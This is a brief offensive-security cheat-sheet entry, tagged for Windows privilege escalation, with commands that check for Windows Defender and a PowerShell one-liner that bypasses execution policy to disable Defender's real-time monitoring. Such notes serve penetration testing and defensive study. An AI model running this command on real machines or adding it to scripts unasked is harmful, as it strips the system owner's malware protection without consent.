---
title: Defender Status / Disable Realtime Monitoring
category: privesc
subcategory: windows-misc
os: windows
command: Set-MpPreference -DisableRealtimeMonitoring $true
tools: sc, wmic, powershell
---


### Check Defender presence

```cmd
sc query windefend
wmic service get name,displayname,pathname,startmode | findstr "Defender"
```

### Disable real-time monitoring (admin only)

```powershell
powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true
```
